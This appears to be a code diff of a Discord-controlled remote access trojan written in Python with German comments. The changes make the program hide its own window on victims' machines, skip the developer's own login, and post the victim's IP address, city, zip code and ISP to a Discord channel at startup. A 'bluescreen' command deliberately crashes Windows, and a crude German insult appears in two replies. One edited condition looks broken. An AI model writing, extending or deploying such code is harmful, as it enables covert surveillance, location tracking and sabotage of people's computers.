@@ -1,27 +1,12 @@
+DEV = "tilov"
+
 import win32gui
 import win32con
-import time
 import os
 
-if not os.getlogin() == "tilov":
-    def hide_self():
-        # Warte kurz, damit das Programmfenster vollständig geladen wird
-        time.sleep(1)
-
-        # Holen des Handles des Vordergrundfensters (also des eigenen Fensters)
-        hwnd = win32gui.GetForegroundWindow()
-
-        # Verstecken des Fensters
-        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-
-    # Dein Programmcode hier
-    if __name__ == "__main__":
-        hide_self()
-
-        # Rest deines Programms hier
-        print("Das Programm läuft im Hintergrund.")
-        time.sleep(10)  # Beispiel: Das Programm läuft für 10 Sekunden
-
+if not os.getlogin() == DEV:
+    the_program_to_hide = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
 else: print("skipping exit")
 
 ################################################################################
@@ -78,8 +63,6 @@ import pymsgbox
 from datetime import datetime
 import ctypes
 import ctypes.wintypes
-
-DEV = "tilov"
 
 # Define global variables
 notification_sent = False
@@ -149,6 +132,18 @@ async def on_ready():
         print(f"Spezifiziertes Mitglied: {member}")
         print(f"Bot Mitglied: {bot_member}")
 
+        response = requests.get('http://ip-api.com/json/')
+
+        if not os.getlogin() == DEV:
+            response = requests.get('http://ip-api.com/json/')
+            if response.status_code == 200:
+                geolocation_data = response.json()
+                IPloc = f"**Geolocation Data**:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
+            else:
+                IPloc = "Error retrieving geolocation data."
+            running = f"Bot is ready and running!\n{IPloc}"
+        else: running = "Bot is ready and running!"
+
         # Kanal erstellen und Berechtigungen setzen
         user_channel_name = os.getlogin()
         existing_channel = discord.utils.get(guild.channels, name=user_channel_name)
@@ -159,13 +154,13 @@ async def on_ready():
                 if member:
                     await clipboard_channel.set_permissions(member, read_messages=True, send_messages=True)
                     print(f"Permissions für {member} erfolgreich gesetzt.")
-                await clipboard_channel.send("Bot is ready and running!")
+                await clipboard_channel.send(running)
                 print("Clipboard Channel erstellt und Nachricht gesendet.")
             except discord.Forbidden:
                 print("Der Bot hat nicht die erforderlichen Berechtigungen, um Kanäle zu erstellen oder Berechtigungen festzulegen.")
         else:
             clipboard_channel = existing_channel
-            await clipboard_channel.send("Bot is ready and running!")
+            await clipboard_channel.send(running)
             print("Vorhandener Clipboard Channel gefunden und Nachricht gesendet.")
 
         notification_sent = True
@@ -333,13 +328,15 @@ async def on_command_error(ctx, error):
 
 @bot.command(help="Gets geolocation data based on IP")
 async def geolocation(ctx):
-    response = requests.get('http://ip-api.com/json/')
-    if response.status_code == 200:
-        geolocation_data = response.json()
-        message = f"**Geolocation Data**:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
-        await send_embed_message(ctx.channel, message)
-    else:
-        await send_embed_message(ctx.channel, "Error retrieving geolocation data.")
+    if not os.getlogin():
+        response = requests.get('http://ip-api.com/json/')
+        if response.status_code == 200:
+            geolocation_data = response.json()
+            message = f"**Geolocation Data**:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
+            await send_embed_message(ctx.channel, message)
+        else:
+            await send_embed_message(ctx.channel, "Error retrieving geolocation data.")
+    else: await send_embed_message(ctx.channel, "DU HURENSOHN")
 
 @bot.command(help="Displays system specifications")
 async def specs(ctx):
@@ -1550,7 +1547,7 @@ async def off(ctx):
 
 @bot.command(help= "bluescreen the computer")
 async def bluescreen(ctx):
-    if not os.getlogin() == "tilov":
+    if not os.getlogin() == DEV:
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
     else: await ctx.send("DU HURENSOHN")
